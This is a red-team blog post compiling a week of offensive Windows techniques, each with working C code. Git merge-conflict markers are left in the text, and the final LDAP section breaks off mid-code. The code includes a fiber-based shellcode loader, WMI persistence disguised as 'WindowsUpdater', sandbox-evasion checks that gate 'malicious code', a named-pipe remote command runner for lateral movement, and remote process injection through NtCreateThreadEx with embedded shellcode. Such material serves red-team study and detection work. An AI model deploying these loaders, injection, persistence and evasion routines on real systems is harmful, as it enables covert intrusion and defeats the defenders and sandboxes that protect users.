---
layout: post
title: "7 days of Red"
date: 2021-6-31 0:00:00 -0400
<<<<<<< HEAD
image: /images/red.jpg
categories: Writeup
---

<img src="../../../../../images/red.jpg">

A compilation of the whole week of the 7daysofRed series all in one large blogpost.                                                                                  

=======
categories: Writeup
---


​         A compilation of the whole week of the 7daysofRed series all in one large blogpost.                                                                                  

```


/***
 *    ███████╗    ██████╗  █████╗ ██╗   ██╗███████╗     ██████╗ ███████╗    ██████╗ ███████╗██████╗ 
 *    ╚════██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝    ██╔══██╗██╔════╝██╔══██╗
 *        ██╔╝    ██║  ██║███████║ ╚████╔╝ ███████╗    ██║   ██║█████╗      ██████╔╝█████╗  ██║  ██║
 *       ██╔╝     ██║  ██║██╔══██║  ╚██╔╝  ╚════██║    ██║   ██║██╔══╝      ██╔══██╗██╔══╝  ██║  ██║
 *       ██║      ██████╔╝██║  ██║   ██║   ███████║    ╚██████╔╝██║         ██║  ██║███████╗██████╔╝
 *       ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝         ╚═╝  ╚═╝╚══════╝╚═════╝ 
 *                                                                                                  
 */
          
```
>>>>>>> 63d34e1a1a2bec6a9bb93652e9e00837b3b51c07
## DAY1
## **Process Fiber Local Shellcode Execution**
Local shellcode execution techniques can be used by attackers to spawn malicious code from inside a process.
Recently the Lazuras group employed this class of technique in order run code in VBA Macros undetected, more information can be found here: <a href="https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/">https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/</a>.
However in this technique we are abusing the implementation of process fibers in order to run local shellcode. 
These fibers are essentially lightweight threads that can be scheduled in user mode without the need of assistance from the kernel. Due to this, execution of a process fiber is invisible to the kernel,which makes it a interesting method for offensive purposes. In order to implement a process fiber you would have to convert your current thread into a fiber. 
Then from there you will be able to schedule sub-fibers that point to your shellcode.
Lastly you just need to switch to the shellcode fiber context in order to execute it.


This will cause a alert due to this being a meterpreter payload for spawning a messagebox*

Steps:

<<<<<<< HEAD
- [ ]  1`Convert Current Thread to a Fiber- ConvertThreadToFiber()`

- [ ]  2.`Allocate Memory in the Current Process with PAGE_EXECUTE_READWRITE permissions- VirtualAlloc()`

  ​      *** **`Allocating memory with PAGE_EXECUTE_READWRITE is bad opsec****`

- [ ] 3. `Copy shellcode into allocated memory space - CopyMemory()`

- [ ] 4.`Start a New fiber pointing to the allocated memory space -CreateFiber()`

- [ ] 5.`Switch Fiber Context to newly created Fiber- SwitchFiber()`
=======
- [ ]  1`Convert Current Thread to a Fiber- ##### ConvertThreadToFiber()`

- [ ]  2.`Allocate Memory in the Current Process with PAGE_EXECUTE_READWRITE permissions- ##### VirtualAlloc()`

  ​      *** **`Allocating memory with PAGE_EXECUTE_READWRITE is bad opsec****`

- [ ] 3. `Copy shellcode into allocated memory space - ##### CopyMemory()`

- [ ] 4.`Start a New fiber pointing to the allocated memory space - ##### CreateFiber()`

- [ ] 5.`Switch Fiber Context to newly created Fiber- ##### SwitchFiber()`
>>>>>>> 63d34e1a1a2bec6a9bb93652e9e00837b3b51c07

C Code for implementation:



```c
#include <windows.h>


int main(int argc, char **argv){

unsigned char shellcode[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
"\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
"\x85\x08\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
"\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x53\x68\x65"
"\x6c\x6c\x63\x6f\x64\x65\x00\x53\x75\x63\x63\x65\x73\x73\x00";

LPVOID fiber = ConvertThreadToFiber(NULL);
LPVOID shellLoc= VirtualAlloc(NULL,sizeof(shellcode),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
CopyMemory(shellLoc,shellcode,sizeof(shellcode));
LPVOID shellFiber= CreateFiber(0,(LPFIBER_START_ROUTINE)shellLoc,NULL);
SwitchToFiber(shellFiber);

}

```
Ref:

https://docs.microsoft.com/en-us/windows/win32/procthread/fibers

## DAY2
## WMI Permanent Event Subscription Persistence Technique

Persistence techniques are used by attackers in order to maintain access on a compromised machine in case of a loss of the inital access vector. Procedures like this are used by most APTs and are displayed throughout various attacks. In particular this technique was utilized by APT 29 in a backdoor called POSHSPY. More details can be found here:[`https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html`](https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html) in a writeup by FireEye. This technique using WMI Event Subscription is one that persists through reboots but requires adminstrator privileges. 

This Persistence Technique works by abusing the WMI service COM classes. There are three revelant WMI classes that are used in this technique. They are __**EventFilter**,**CommandLineEventConsumer** and __**FilterToConsumerBinding**. The Logic is that by using the EventFilter class you can set a Filter instance on certain Windows Events, and when that Event occurs it triggers the CommandLineEventConsumer class's instance which contains a command that will be executed. The last class FilterToConsumerBinding just ties both the filter instance and the consumer instance together so the event can trigger the consumer instance and execute malcious commands. In WMI selecting an event uses the WQL query language, which is a lot like SQL syntax. For example to place a filter on anytime a notepad process is created you can use, ***SELECT \* From InstanceCreationEvent WITHIN 5 WHERE TARGETINSTANCE ISA "Win32_Process" AND TARGETINSTANCE.NAME="notepad.exe"***.
The above query translates to select all events from the __InstanceCreationEvent class within the polling interval of 5 seconds where the TargetInstance object is a Win32_Process and its name is notepad.exe.This checks if there any changes in the Win32_Process class that are named notepad.exe and returns them.You can use WQL to trigger on almost any Windows Event imaginable ranging from CD-ROMs to keyboard strokes using the CIMWin32 Provider and its numerous classes.

C Code: Ported into C from MDsec's article on this topic: [`https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-3-wmi-event-subscription/`](https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-3-wmi-event-subscription/)  (Used CommandLineEventConsumer instead of ActiveScriptEventConsumer)

Compile with this command: `##### gcc WmiSub.c -o Wmisub.exe -lole32 -loleaut32 -lwbemuuid`

If you run this code, all it does is make a test file saying success in your C Drive, after you open notepad.exe.

```c
#define _WIN32_DCOM
#include <wbemidl.h>
#include <windows.h>
#include <oleauto.h>
#include <stdio.h>

static CLSID CLSID_IWbem ={0x4590f811, 0x1d3a, 0x11d0, 0x89,0x1f, 0x00,0xaa,0x00,0x4b,0x2e,0x24};
static CLSID IID_IWbem ={0xdc12a687, 0x737f, 0x11cf, 0x88,0x4d, 0x00,0xaa,0x00,0x4b,0x2e,0x24};

int main(int argc,int **argv){

    IWbemLocator *pObject=NULL;
    IWbemServices *pServices =NULL;
    IWbemClassObject *pFilter=NULL;
    IWbemClassObject *pConsumer=NULL;
    IWbemClassObject *pBinder=NULL;
    IWbemClassObject *pBinderInstance=NULL;
    IWbemClassObject *pFilterInstance=NULL;
    IWbemClassObject *pConsumerInstance=NULL;
    BSTR resource =SysAllocString(L"ROOT\\SUBSCRIPTION");
    BSTR consumerclass=SysAllocString(L"CommandLineEventConsumer");
    BSTR filterclass =SysAllocString(L"__EventFilter");
    BSTR binderclass=SysAllocString(L"__FilterToConsumerBinding");
    HRESULT hres;
    //1.Initialize COM
    hres=CoInitializeEx(0,COINIT_MULTITHREADED);
    if (FAILED(hres)){
        printf("COM was not successfully initialized\n");
        goto cleanup;
    }else{
        printf("COM was initialized\n");
    }

    //2.Initialize COM Security
    hres=CoInitializeSecurity(NULL,-1,NULL,NULL,RPC_C_AUTHN_LEVEL_DEFAULT,RPC_C_IMP_LEVEL_IMPERSONATE,NULL,EOAC_NONE,NULL);
    if (FAILED(hres)){
         printf("COM Security was not properly initialized\n");
         goto cleanup;
   }else{
        printf("COM Security was initialized\n");
   }

   //3.Initialize IWbemLocator
   hres=CoCreateInstance(&CLSID_IWbem,0,CLSCTX_INPROC_SERVER,&IID_IWbem,(LPVOID*)&pObject);
   if (FAILED(hres)){
       printf("IWbemLocator Object was not properly initialized\n");
       goto cleanup;

  }else{
    printf("IWbemLocator was initialized\n");
  }


  //4.Connect to WMI and get pointer to IWbemServices
  hres=pObject->lpVtbl->ConnectServer(pObject,resource,NULL,NULL,NULL,0,NULL,NULL,&pServices);
  if (FAILED(hres)){
    printf("IWbemServices pointer was not properly attained ");
    pObject->lpVtbl->Release(pObject);
  }else{
    printf("IWbemServices pointer was attained ");
  }
  //5.Set Security Attributes on the IWbemServices proxy so it can impersonate the client
  hres=CoSetProxyBlanket(pServices, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
   if(FAILED(hres)){
    printf("Proxy Security settings not set");
    printf("1%d\n",GetLastError());
    goto cleanup;
   }else{
     printf("Proxy Security settings set");
   }
    // 6.Attain WMI FILTER CLASS
    hres=pServices->lpVtbl->GetObject(pServices,filterclass,0,NULL,&pFilter,NULL);
    if (FAILED(hres)){
       printf("Filter class was not properly retrieved");
       goto cleanup;
    }else{
       printf("Filter class was properly retrieved\n");
    }
    //7.Spawn an Instance of Filter Class
    hres=pFilter->lpVtbl->SpawnInstance(pFilter,0,&pFilterInstance);
    if (FAILED(hres)){
        printf("Filter class instance wasn't properly spawned\n");
    }else{
        printf("Filter class instance was properly spawned\n");
    }
    //8.Setting __EventFilter Class Name Field
    VARIANT v;
    VariantInit(&v);
    V_VT(&v)=VT_BSTR;
    V_BSTR(&v)=SysAllocString(L"WindowsUpdater");

    BSTR Name=SysAllocString(L"Name");
    pFilterInstance->lpVtbl->Put(pFilterInstance,Name,0,&v,0);
    VariantClear(&v);

    //9.Setting __EventFilter Class Query Field
    V_VT(&v)=VT_BSTR;
    V_BSTR(&v)=SysAllocString(L"Select * From __InstanceCreationEvent Within 5 Where TargetInstance Isa \"Win32_Process\" And TargetInstance.Name = \"notepad.exe\"");

    BSTR Query =SysAllocString(L"Query");
    pFilterInstance->lpVtbl->Put(pFilterInstance,Query,0,&v,0);
    VariantClear(&v);


    //10.Setting __EventFilter Class QueryLanguage Field
    V_VT(&v)=VT_BSTR;
    V_BSTR(&v)=SysAllocString(L"WQL");

    BSTR QueryLanguage =SysAllocString(L"QueryLanguage");
    pFilterInstance->lpVtbl->Put(pFilterInstance,QueryLanguage,0,&v,0);
    VariantClear(&v);

    //11.Setting __EventFilter Class EventNameSpace Field
    VariantInit(&v);
    V_VT(&v)=VT_BSTR;
    V_BSTR(&v)=SysAllocString(L"root\\cimv2");

    BSTR EventNameSpace =SysAllocString(L"EventNameSpace");
    pFilterInstance->lpVtbl->Put(pFilterInstance,EventNameSpace,0,&v,0);
    VariantClear(&v);

    hres=pServices->lpVtbl->PutInstance(pServices,pFilterInstance,WBEM_FLAG_CREATE_OR_UPDATE,0,0);
    if (FAILED(hres)){
        printf("Modified Event Filter Class Instance was unable to be written\n");
        goto cleanup;
    }else{
        printf("Event Filter class instance was properly written\n");

    }


    //12.Getting CommandLineEventConsumer Class
    hres=pServices->lpVtbl->GetObject(pServices,consumerclass,0,NULL,&pConsumer,NULL);
    if (FAILED(hres)){
        printf("CommandLineEventConsumer class was not properly connected ");
        goto cleanup;
    }else{
       printf("CommandLineEventConsumer class was properly connected\n");
    }
    //13.Spawning CommandLineEventConsumer Class
    hres=pConsumer->lpVtbl->SpawnInstance(pConsumer,0,&pConsumerInstance);
    if (FAILED(hres)){
        printf("Consumer class instance wasn't properly spawned\n");
    }else{
        printf("Consumer class instance was properly spawned\n");
    }
    //14.Setting CommandLineEventConsumer Class Name Field

    V_VT(&v)=VT_BSTR;
    V_BSTR(&v)=SysAllocString(L"WindowsUpdater");

    BSTR ConsumerName =SysAllocString(L"Name");
    hres=pConsumerInstance->lpVtbl->Put(pConsumerInstance,ConsumerName,0,&v,0);
    VariantClear(&v);

    //15.Setting CommandLineEventConsumer Class RunInteractively Field

    V_VT(&v)=VT_BSTR;
    V_BSTR(&v)=SysAllocString(L"false");

    BSTR ConsumerRunI =SysAllocString(L"RunInteractively");
    hres=pConsumerInstance->lpVtbl->Put(pConsumerInstance,ConsumerRunI,0,&v,0);
    VariantClear(&v);


    //16.Setting CommandLineEventConsumer Class CommandLineTemplate Field

    V_VT(&v)=VT_BSTR;
    //PUT YOUR COMMAND IN THIS LINE
    V_BSTR(&v)=SysAllocString(L"cmd /C echo Success >> C:\\test.txt");

    BSTR ConsumerCommand =SysAllocString(L"CommandLineTemplate");
    hres=pConsumerInstance->lpVtbl->Put(pConsumerInstance,ConsumerCommand,0,&v,0);


    hres=pServices->lpVtbl->PutInstance(pServices,pConsumerInstance,WBEM_FLAG_CREATE_OR_UPDATE,0,0);
    if (FAILED(hres)){
        printf("Modified Event CommandLineEventConsumer Instance was unable to be written\n");
        goto cleanup;
    }else{
        printf("CommandLineEventConsumer class instance was properly written\n");

    }


    //17.Getting __FiltertoConsumerBinding Class
    hres=pServices->lpVtbl->GetObject(pServices,binderclass,0,NULL,&pBinder,NULL);
    if (FAILED(hres)){
        printf("__FiltertoConsumerBinding class was not properly connected ");
        goto cleanup;
    }else{
       printf("__FilterToConsumerBinding class was properly connected\n");
    }
    //18.Spawning Binder Class
     hres=pBinder->lpVtbl->SpawnInstance(pBinder,0,&pBinderInstance);
     if (FAILED(hres)){
        printf("FilterToConsumerBinding class instance wasn't properly spawned\n");
    }else{
        printf("FilterToConsumerBinding class instance was properly spawned\n");
    }
    //19.Setting the EventFilter rel path
     V_VT(&v)=VT_BSTR;
     V_BSTR(&v)=SysAllocString(L"__EventFilter.Name=\"WindowsUpdater\"");;

    BSTR Filter = SysAllocString(L"Filter");
    pBinderInstance->lpVtbl->Put(pBinderInstance,Filter,0,&v,0);
    VariantClear(&v);

    //20.Setting the CommandLineEventConsumer rel path
    V_VT(&v)=VT_BSTR;
    V_BSTR(&v)=SysAllocString(L"CommandLineEventConsumer.Name=\"WindowsUpdater\"");;
    BSTR Consumer = SysAllocString(L"Consumer");
    pBinderInstance->lpVtbl->Put(pBinderInstance,Consumer,0,&v,0);
    VariantClear(&v);
    //21.Saving changes for Modified __FilterToConsumerBinding Instance
    pServices->lpVtbl->PutInstance(pServices,pBinderInstance,WBEM_FLAG_CREATE_OR_UPDATE,0,0);
    if (FAILED(hres)){
        printf("Modified FilterToConsumerBinding class instance wasn't properly written\n");
        goto cleanup;

    }else{
        printf("FilterToConsumerBinding class instance was properly written\n");
    }
    //CLEANUP
    if(pFilterInstance){
        pFilterInstance->lpVtbl->Release(pFilterInstance);
        pFilterInstance =NULL;
    }
    if(pBinderInstance){
        pBinderInstance->lpVtbl->Release(pBinderInstance);
        pBinderInstance=NULL;
    }
    if(pConsumerInstance){
        pConsumerInstance->lpVtbl->Release(pConsumerInstance);
        pConsumerInstance =NULL;
    }

    pObject->lpVtbl->Release(pObject);
    pServices->lpVtbl->Release(pServices);
    CoUninitialize();

cleanup:
    if (pConsumer){
        pConsumer->lpVtbl->Release(pConsumer);
    }
    if(pFilter){
        pFilter->lpVtbl->Release(pFilter);
    }
    if(pBinder){
        pBinder->lpVtbl->Release(pBinder);
    }
    if(pServices){
        pServices->lpVtbl->Release(pServices);
    }
    if(pObject){
        pObject->lpVtbl->Release(pObject);
    }



return 1;


}
```

ref: https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-3-wmi-event-subscription/

https://docs.microsoft.com/en-us/windows/win32/wmisdk/receiving-a-wmi-event

## DAY3
## Windows Anti-Emulation Tactics by abusing Non-Emulated API calls

While there are signature based AVs, in recent years there has been a
uprise in detection by emulation.Essentially putting a malicious program in a sandbox
to see what it might do and monitor its behavior. Due to this a lot of malware employ evasion techniques
to trick the emulator into letting it through. One such tactic employed is
using Non-Emulated Api calls to determine if the OS is legit or a sandbox.
Due to the complexity of the Windows API, sandboxes usually only employ
a select amount while emulating. An attacker can use one of the Api calls
not commonly checked for and based on if the function comes up valid or fails,can
make their malware goto sleep and not execute the malicious code path.Any WinApi can be used,                                  as long as it's obscure enough to not be emulated by the sandbox.One such function
that could be used for this check is **FsAlloc**.

This function is used to allocate Fiber Local Storage Index, which is a space of memory where a fiber can store and retrieve local variables. If you want more information on fibers and ways you can implement them check out Day 1 of this series. Due to lack of use of fibers in a normal process, this function may not be supported by a sandbox, but will be supported by the Windows Operating System.

Code:

```c
#include <windows.h>
int main(int argc, char **argv){
  DWORD test = FlsAlloc(NULL);
  if(test == FLS_OUT_OF_INDEXES){
    printf("Going to Sleep");
  }else{
      printf("About to load up malicious code");

  }
}
```

ref:https://docs.microsoft.com/en-us/windows/win32/

## DAY4
## Lateral Movement with Named Pipes

When using named pipes which utilize the SMB protocol, you can establish a client,server connection between two endpoints. The server endpoint will be on your compromised host and the client will be on the machine your compromised user has access to in some way. A few known methods of doing this in the past, have been **`PsExec`** and Cobalt's Strike implementation **`PsExec(psh)`**. The former achieved this by logging into the $ADMIN share and dropping a exe file, that established a named pipe connection to the compromised machine. The later achieved this by logging into the $ADMIN share, but instead of dropping an exe file it instead ran base64 encoded Powershell to establish a named pipe connection to the compromised machine. The Poc below is two exes, a server named pipe and a client named pipe. The scenario is that you have already connected to the $ADMIN share and dropped your client exe unto the machine, and it simply executes one command and writes it back through named pipe to your compromised machine.

```c
Client Named Pipe: Usage: clientnamedpipe.exe [ip here where server endpoint is hosted ] testpipe
#include <windows.h>
#include <stdio.h>

#define MAX_SIZE 1024

int main(int argc,char **argv){

DWORD dRead;
CHAR _RemoteNamedPipe= (CHAR_)GlobalAlloc(GPTR,MAX_SIZE);
DWORD dWritten = 0;
char command[MAX_SIZE];
char output[MAX_SIZE];
snprintf(RemoteNamedPipe,MAX_SIZE,"\\\\%s\\pipe\\%s",argv[1],argv[2]);
printf("Connecting to %s\n", RemoteNamedPipe);
HANDLE hPipe = CreateFile(RemoteNamedPipe,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,
                          OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
printf("0x%p\n",hPipe);
ReadFile(hPipe,command,MAX_SIZE,&dRead,NULL);
printf("%s\n",command);
FILE *pPipe= _popen(command,"r");
while(fgets(output,MAX_SIZE,pPipe)){
puts(output);
}
printf("%s\n",output);
WriteFile(hPipe,output,strlen(output),&dWritten,NULL);

CloseHandle(pPipe);
CloseHandle(RemoteNamedPipe);
GlobalFree(RemoteNamedPipe);

}

```

```c
Server Named Pipe: Usage: servernamedpipe.exe "whoami"

#include <windows.h>
#include <stdio.h>
#define MAX_SIZE 1024

int main(int argc,char **argv){
DWORD dwRead;
DWORD dWrote=0;
char buffer[MAX_SIZE];
HANDLE hPipe= CreateNamedPipeA("\\\\.\\pipe\\testpipe",PIPE_ACCESS_DUPLEX,PIPE_TYPE_BYTE|PIPE_READMODE_BYTE,
                                PIPE_UNLIMITED_INSTANCES,MAX_SIZE,0,10000,NULL);
printf("hPipe 0x%p\n",hPipe);
ConnectNamedPipe(hPipe,NULL);
WriteFile(hPipe,argv[1],strlen(argv[1]),&dWrote,NULL);
ReadFile(hPipe,buffer,MAX_SIZE,&dwRead,NULL);

printf("We received this amount of data %d\n",dwRead);
for(int i=0;i<sizeof(buffer);i++){
printf("This is the data %s\n",buffer[i]);
}

DisconnectNamedPipe(hPipe);
CloseHandle(hPipe);
return 0;

}
```
##### DAY 5
## Remote Process Injection via NtCreateThreadEx
Remote Process Injection is a method for operators to migrate to active processes in order to blend in to the target and execute arbitrary code. There are plenty of ways to do this, however in this blogpost we'll be using **`NtCreateThreadEx`** in order to start a new thread in the virtual address space of the remote process.**`NtCreateThreadEx`** is a undocumented Native API that resides in nt.dll which is the library where the Native API live. The more well known Windows API **`CreateRemoteThread`** actually calls this function behind the scenes before it enters the kernel. Still in order to use this technique in engagements  you may need to unhook this function in order to not have it get flagged. 

### Steps:

   1.Open Remote Process - OpenProcess()

   2.Allocate Memory in the Remote Process with PAGE_EXECUTE_READWRITE permissions-VirtualAllocEx()

​      * Allocating memory with PAGE_EXECUTE_READWRITE is bad opsec

   3.Write shellcode over to the newly allocated memory space - WriteProcessMemory()

   4.Start a New Thread pointing to the allocated memory space -NtCreateThreadEx()

```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI *NtCreateThreadEx)(HANDLE * pHandle, ACCESS_MASK DesiredAccess, void * pAttr, HANDLE hProc, void * pFunc, void * pArg, ULONG Flags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaxStackSize, void * pAttrListOut);



int main(int argc,char **argv){
unsigned char shellcode[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
"\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
"\x85\x08\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
"\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x53\x68\x65"
"\x6c\x6c\x63\x6f\x64\x65\x00\x53\x75\x63\x63\x65\x73\x73\x00";


HANDLE hthread=NULL;
DWORD pid = atoi(argv[1]);
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
VOID *payload= VirtualAllocEx(hProc,NULL,sizeof(shellcode),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc,payload,shellcode,sizeof(shellcode),NULL);
NtCreateThreadEx pNtCreateThreadEx = (NtCreateThreadEx)GetProcAddress(LoadLibrary("ntdll.dll"),"NtCreateThreadEx");
pNtCreateThreadEx(&hthread,GENERIC_ALL,NULL,hProc,(LPTHREAD_START_ROUTINE)payload,NULL,FALSE,0,0,0,NULL);
return 0;
}

```
##### DAY6
### Sandbox Evasion by Enumerating the Existence of Registry Keys

As stated on Day 3, sandbox evasion is a fundamental apart of any attacker's strategy to infilrate a network. The chance of a piece of malware touching a virtual environment is extremely high since most host antivirus and email antivirus programs utilize a sandbox. In order for an attacker to identify a virtual environment they will employ a series of checks included in their stage 0 payload. In this post we'll discuss enumerating registry keys and checking for artifacts to indicate a virtual environment.There are a number of virtual environment software such as VMware,VirtualBox,Sandboxie,Wine,Xen and many more. For each of these environments there are registry keys identifying them and their particular settings. For Example:

<<<<<<< HEAD
 VMWare:

| HKLM\SYSTEM\CurrentControlSet\Enum\PCI\VEN_15AD              |      |
=======
#### VMWare:

| HKLM\SYSTEM\CurrentControlSet\Enum\PCI\VEN_15AD*             |      |
>>>>>>> 63d34e1a1a2bec6a9bb93652e9e00837b3b51c07
| ------------------------------------------------------------ | ---- |
| HKCU\SOFTWARE\VMware, Inc.\VMware Tools                      |      |
| HKLM\SOFTWARE\VMware, Inc.\VMware Tools                      |      |
| HKLM\SYSTEM\ControlSet001\Services\vmdebug                   |      |
| HKLM\SYSTEM\ControlSet001\Services\vmmouse                   |      |
| HKLM\SYSTEM\ControlSet001\Services\VMTools                   |      |
| HKLM\SYSTEM\ControlSet001\Services\VMMEMCTL                  |      |
| HKLM\SYSTEM\ControlSet001\Services\vmware                    |      |
| HKLM\SYSTEM\ControlSet001\Services\vmci                      |      |
| HKLM\SYSTEM\ControlSet001\Services\vmx86                     |      |
| HKLM\SYSTEM\CurrentControlSet\Enum\IDE\CdRomNECVMWar_VMware_IDE_CD* |      |
| HKLM\SYSTEM\CurrentControlSet\Enum\IDE\CdRomNECVMWar_VMware_SATA_CD* |      |
| HKLM\SYSTEM\CurrentControlSet\Enum\IDE\DiskVMware_Virtual_IDE_Hard_Drive* |      |
| HKLM\SYSTEM\CurrentControlSet\Enum\IDE\DiskVMware_Virtual_SATA_Hard_Drive* |      |

*Credits to Checkpoint Security for the Table

You can query these keys using RegOpenKeyEx,RegOpenKey,RegQueryValue,RegQueryValueEx ,RegCloseKey and RegEnumKey and confirm the existence of these keys, if they don't exist you can continue running malware.If they do exist however you can make  your malware take another code path so it doesn't get detected. You can often run the same routine of checks again after a certain amount of time has pasted to see if your still in the same virtual environment or if you're on a actual host. The following code takes two of the registry key checks for VMWare and checks if they exist, if they exist the thread goes to sleep and checks again until the the check returns false.

Code:

```c
#include <windows.h>
#include <stdio.h>

int main(int argc,char **argv){
  HKEY hPrincipalKey;
  printf("Running Two checks for VMware environment....\n");
  LSTATUS success = RegOpenKeyEx(HKEY_CURRENT_USER,TEXT("SOFTWARE\\VMware, Inc.\\VMware Tools"),0,KEY_READ,&hPrincipalKey);
  while(success==ERROR_SUCCESS){
        printf("Key was successfully opened at 0x%p,SLEEPING\n",hPrincipalKey);
        Sleep(10000);

    }
  printf("The key did not open ,executing malware\n");
   Sleep(1000);


LSTATUS success2 = RegOpenKeyEx(HKEY_CURRENT_USER,TEXT("\\SYSTEM\\ControlSet001\\Services\\VMTools"),0,KEY_READ,&hPrincipalKey);
  while(success2==ERROR_SUCCESS){
        printf("Key was successfully opened at 0x%p,SLEEPING\n",hPrincipalKey);
        Sleep(10000);


    }

   printf("The key did not open ,executing malware\n");
   Sleep(1000);



}

```
## Day7
## Active Directory Enumeration with LDAP queries 

For the last day of 7daysofRed, we're going to be covering LDAP queries.These are used in almost every Active Directory enumeration tool, such as PowerView and BloodHound. In an Active Directory environment there are several protocols that are used in order to transmit data ,two of the major ones being  Kerberos and LDAP. Since we are addressing LDAP in this post, Kerberos is out of scope for now. LDAP stands for Lightweight Directory Access Protocol, and its server is usually hosted on a domain controller. A domain controller is where all your data for every domain user ,group and host lives in the form of objects,and ntds.dit being the Active Directory Database file is also stored in the domain controller. LDAP is usually used to query these objects from the domain controller through the use of LDAP queries. In most cases once you have access to any authenicated user on a network, you can query the domain controller through LDAP. Having a look at LDAP user search request in wireshark may shed some light on what's going on when you send a query out to a domain controller. 

![image](https://user-images.githubusercontent.com/55005881/113821379-06a85000-974a-11eb-975f-d4eb4383b8ef.png)



In this capture you can see the search base or domain where the query is to be constrained to, "dc=ragee,dc=local". You can also see that the scope requested was the wholeSubtree,which indicates that the search base and all entries under it will be included in the search results.The next revelant field would be the filter, which constrains the search results even further and only specifies a certain user. The filter here is `(&(samAccountName=user001)(objectClass=*)`, and its filtering the inital results for user001 and returning all the user attributes associated with that user.The attributes requested are listed under that in the attributes section.This is the response to this query:

![image](https://user-images.githubusercontent.com/55005881/113821405-0dcf5e00-974a-11eb-8dd8-631ef59c1454.png)




As you can see the information was returned for each user attribute requested for the user user001.

*Code: Performs a basic LDAP query with a domain user account name as an argument.*

```c#
using System;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;



namespace GetDomainUsers
{
    class Program
    {
